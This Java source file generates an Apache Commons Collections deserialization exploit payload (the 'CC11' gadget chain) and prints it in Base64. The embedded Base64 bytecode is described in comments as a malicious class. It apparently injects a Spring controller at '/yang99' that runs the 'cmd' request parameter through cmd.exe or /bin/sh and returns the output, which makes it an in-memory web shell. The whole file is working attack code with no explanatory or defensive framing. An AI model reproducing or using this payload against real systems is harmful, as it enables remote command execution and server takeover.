import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11 {
    public static void main(String[] args) throws Exception {

        // 利用javasist动态创建恶意字节码

        byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQA7goAOAB8CgB9AH4IAH8LAIAAgQcAggcAgwsABQCEBwCFCABjBwCGCgAKAIcHAIgHAIkIAIoKAAwAiwcAjAcAjQoAEACOBwCPCgATAJAIAGEKAAgAkQoABgCSBwCTCgAYAJQKABgAlQgAlgsAlwCYCwCZAJoIAJsIAJwKAJ0AngoADQCfCACgCgANAKEHAKIIAKMIAKQKACQAiwgApQgApgcApwoAJACoCgCpAKoKACoAqwgArAoAKgCtCgAqAK4KACoArwoAKgCwCgCxALIKALEAswoAsQCwCwCZALQHALUHALYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExJbmplY3RUb0NvbnRyb2xsZXI7AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABVtYXBwaW5nSGFuZGxlck1hcHBpbmcBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZzsBAAdtZXRob2QyAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC3BwC4BwC5BwC6BwC7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAvAEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2FhYQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAARhcmcwAQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAIUHAL0HAL4HAIkHAL8HAKIHAKcHALUHAMABAApTb3VyY2VGaWxlAQAXSW5qZWN0VG9Db250cm9sbGVyLmphdmEMADkAOgcAwQwAwgDDAQA5b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5EaXNwYXRjaGVyU2VydmxldC5DT05URVhUBwDEDADFAMYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAMcAyAEAEkluamVjdFRvQ29udHJvbGxlcgEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAcveWFuZzk5DAA5AMsBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMADkAzAEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MADkAzQwAOQBgDADOAM8BAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDADQANEMANIA0wEAA2NtZAcAvQwA1ADVBwC+DADWANcBAAABAAdvcy5uYW1lBwDYDADZANUMANoA2wEAA3dpbgwA3ADdAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAHY21kLmV4ZQEAAi9jAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA5AOMBAAJcQQwA5ADlDADmAOcMAOgA2wwA6QA6BwC/DADqAGAMAOsAOgwA7ADtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2lvL1ByaW50V3JpdGVyAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOAAAAAAABQABADkAOgACADsAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPAAAACoACgAAABgABAAZABMAGwAfAB0AKwAfAD0AIQBKACMAXAAlAGcAJgBwACcAPQAAAFIACAAAAHEAPgA/AAAAEwBeAEAAQQABAB8AUgBCAEMAAgArAEYARABFAAMAPQA0AEYARwAEAEoAJwBIAEkABQBcABUASgBLAAYAZwAKAEwAPwAHAE0AAAAMAAUATgBPAFAAUQBSAAEAUwBUAAMAOwAAAD8AAAADAAAAAbEAAAACADwAAAAGAAEAAAAsAD0AAAAgAAMAAAABAD4APwAAAAAAAQBVAFYAAQAAAAEAVwBYAAIATQAAAAQAAQBZAFoAAAAJAgBVAAAAVwAAAAEAUwBbAAMAOwAAAEkAAAAEAAAAAbEAAAACADwAAAAGAAEAAAAxAD0AAAAqAAQAAAABAD4APwAAAAAAAQBVAFYAAQAAAAEAXABdAAIAAAABAF4AXwADAE0AAAAEAAEAWQBaAAAADQMAVQAAAFwAAABeAAAAAQA5AGAAAgA7AAAAOQABAAIAAAAFKrcAAbEAAAACADwAAAAGAAEAAAA0AD0AAAAWAAIAAAAFAD4APwAAAAAABQBhAGIAAQBaAAAABQEAYQAAAAEAYwA6AAIAOwAAAdMABgAIAAAAzbgAAsAAGMAAGLYAGUy4AALAABjAABi2ABpNKxIbuQAcAgBOLLkAHQEAOgQtxgCTEh46BRIfuAAgtgAhEiK2ACOZACG7ACRZBr0ADVkDEiVTWQQSJlNZBS1TtwAnOganAB67ACRZBr0ADVkDEihTWQQSKVNZBS1TtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMhkEGQW2ADMZBLYANBkEtgA1pwAMLBEBlLkANgIApwAETrEAAQAaAMgAywA3AAMAPAAAAE4AEwAAADkADQA6ABoAPgAjAD8AKwBAAC8AQQAzAEMAQwBEAGEARgB8AEgAkgBJAKYASgCrAEsAsgBMALcATQC8AE4AvwBQAMgAUgDMAFMAPQAAAFwACQBeAAMAZABlAAYAMwCJAGYAYgAFAHwAQABkAGUABgCSACoAZwBoAAcAIwClAGkAYgADACsAnQBqAGsABAAAAM0APgA/AAAADQDAAGwAbQABABoAswBuAG8AAgBwAAAANgAI/wBhAAYHAHEHAHIHAHMHAHQHAHUHAHQAAPwAGgcAdvwAJQcAd0EHAHT4ABr5AAhCBwB4AABNAAAABAABAHkAAQB6AAAAAgB7");        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(hashset);
            oos.close();
//        System.out.println(barr);

            System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));

//            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc11"));
//            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}